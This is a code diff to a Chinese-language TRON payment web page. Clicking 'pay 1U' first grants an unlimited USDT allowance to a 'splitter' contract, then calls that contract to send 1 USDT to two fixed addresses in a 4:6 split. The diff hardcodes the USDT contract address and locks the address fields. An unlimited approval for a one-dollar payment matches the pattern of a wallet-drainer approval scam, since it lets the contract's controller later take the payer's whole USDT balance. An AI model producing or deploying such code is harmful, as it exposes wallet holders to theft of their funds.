@@ -4,7 +4,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>支付 1U（授权并按4:6分发）</title>
+  <title>支付 1U（授权并按4:6分发，调用合约）</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
   <style>
     body {
@@ -72,13 +72,17 @@
 
 <body>
   <h2>支付 1U</h2>
-  <p class="muted">点击“支付 1U”将先对 USDT 执行无限授权（approve unlimited），再按 <strong>4:6</strong> 比例分发到固定收款地址：
-    <br/>A: <code>TLPCodfUNC8bJgtCBvJQmH5Q52WHUNk65G</code>
-    <br/>B: <code>TT1JwR7C7iEifVTRAcdYAxgASBWX7gBZ8N</code>
+  <p class="muted">点击“支付 1U”将先对 USDT 执行对“分发合约”的无限授权（approve unlimited），再调用合约按 <strong>4:6</strong> 比例把 1U 分发到固定收款地址：
+    <br />A: <code>TLPCodfUNC8bJgtCBvJQmH5Q52WHUNk65G</code>
+    <br />B: <code>TT1JwR7C7iEifVTRAcdYAxgASBWX7gBZ8N</code>
   </p>
   <div class="grid">
-    <div class="col-6"><label>USDT 合约地址</label><input id="usdt" placeholder="T... (USDT)" /></div>
-    <div class="col-6"><label>分发合约地址</label><input id="splitter" placeholder="T... (myTron)" /></div>
+    <div class="col-6"><label>USDT 合约地址</label>
+      <div id="usdtView"></div>
+    </div>
+    <div class="col-6"><label>分发合约地址</label>
+      <div id="splitterView"></div>
+    </div>
     <!-- 固定 4:6，不再提供修改输入 -->
   </div>
   <div style="margin-top:12px" class="row">
@@ -89,6 +93,9 @@
 
   <script>
     (function () {
+      // 固定 USDT 与 合约地址：请在此处填入你的地址（Base58）。
+      var USDT_ADDR = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+      var SPLITTER_ADDR = '';
       function log(m) { var el = document.getElementById('log'); el.textContent += m + '\n' }
       function ensure() { if (!window.tronLink) { log('未检测到 TronLink'); return false; } return true; }
       function connect() { return window.tronLink.request({ method: 'tron_requestAccounts' }); }
@@ -97,19 +104,26 @@
       function toBase(amount, decimals) { var p = 1; for (var i = 0; i < decimals; i++) p *= 10; return (amount * p) | 0; }
       function getDecimals(usdt) { return window.tronWeb.contract().at(usdt).then(c => c.decimals().call()); }
 
+      document.addEventListener('DOMContentLoaded', function () {
+        var uv = document.getElementById('usdtView');
+        var sv = document.getElementById('splitterView');
+        if (uv) uv.textContent = USDT_ADDR || '未配置';
+        if (sv) sv.textContent = SPLITTER_ADDR || '未配置';
+      });
+
       document.getElementById('btnConnect').onclick = function () { if (!ensure()) return; connect().then(() => log('连接成功')).catch(e => log('连接失败:' + e)); };
       document.getElementById('btnPay').onclick = function () {
         if (!window.tronWeb || !window.tronWeb.ready) { log('TronWeb 未就绪'); return; }
-        var usdt = document.getElementById('usdt').value.trim();
-        var splitter = document.getElementById('splitter').value.trim();
-        if (!usdt || !splitter) { log('请填写 USDT 与 分发合约地址'); return; }
+        var usdt = USDT_ADDR;
+        var splitter = SPLITTER_ADDR;
+        if (!usdt || !splitter) { log('未配置 USDT 或 分发合约地址，请在代码顶部常量处设置'); return; }
         getDecimals(usdt).then(function (dec) {
           var one = 1; for (var i = 0; i < dec; i++) one *= 10; // 1 USDT
           var max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-          log('先执行无限授权...');
+          log('先对合约执行无限授权...');
           return approve(usdt, splitter, max).then(function (res) { log('授权交易已提交: ' + JSON.stringify(res)); return one; });
         }).then(function (one) {
-          log('再调用分发 1U (4:6) ...');
+          log('再调用合约分发 1U (4:6) ...');
           return donate(splitter, usdt, one);
         }).then(function (res) {
           log('分发交易已提交: ' + JSON.stringify(res));
